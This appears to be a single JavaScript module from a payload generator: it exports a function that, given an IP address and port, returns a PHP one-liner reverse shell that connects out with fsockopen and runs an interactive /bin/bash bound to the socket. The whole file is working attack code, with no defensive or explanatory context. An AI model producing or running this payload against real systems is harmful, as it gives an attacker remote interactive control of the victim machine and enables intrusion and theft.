module.exports = (ip, port) => 
  `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`;
